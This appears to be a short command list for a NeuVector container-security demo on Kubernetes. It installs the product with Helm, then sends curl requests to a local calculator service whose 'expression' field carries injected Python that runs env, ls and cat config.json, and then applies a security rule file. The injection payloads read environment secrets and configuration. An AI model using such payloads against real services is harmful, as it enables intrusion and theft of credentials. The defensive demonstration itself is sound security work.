helm install -n neuvector -f values.yaml neuvector neuvector/core --create-namespace
watch kubectl get pods -n neuvector
echo https://localhost:$(kubectl get --namespace neuvector -o jsonpath="{.spec.ports[0].nodePort}" services neuvector-service-webui)
curl -k http://localhost:31234/calc  -H "Content-Type: application/json" -X POST -d '{"expression": "1 + 2"}' 2> /dev/null | jq
curl -k http://localhost:31234/calc  -H "Content-Type: application/json" -X POST -d '{"expression": "2 ; import subprocess ; tmp=subprocess.run(['\''env'\''], capture_output=True) ; result = tmp.stdout.decode('\''utf-8'\'')"}' 2> /dev/null | jq '.response' -r
curl -k http://localhost:31234/calc  -H "Content-Type: application/json" -X POST -d '{"expression": "2 ; import subprocess ; tmp=subprocess.run(['\''ls'\''], capture_output=True) ; result = tmp.stdout.decode('\''utf-8'\'')"}' 2> /dev/null | jq '.response' -r
curl -k http://localhost:31234/calc  -H "Content-Type: application/json" -X POST -d '{"expression": "2 ; import subprocess ; tmp=subprocess.run(['\''cat'\'', '\''config.json'\''], capture_output=True) ; result = tmp.stdout.decode('\''utf-8'\'')"}' 2> /dev/null | jq '.response' -r
curl -k http://localhost:31234/calc  -H "Content-Type: application/json" -X POST -d '{"expression": "2 ; import subprocess ; tmp=subprocess.run(['\''cat'\'', '\''config.json'\''], capture_output=True) ; result = tmp.stdout.decode('\''utf-8'\'')"}' 2> /dev/null
less nv_sec_rule_p.yaml
kubectl apply -f nv_sec_rule_p.yaml
kubectl delete -f nv_sec_rule_p.yaml
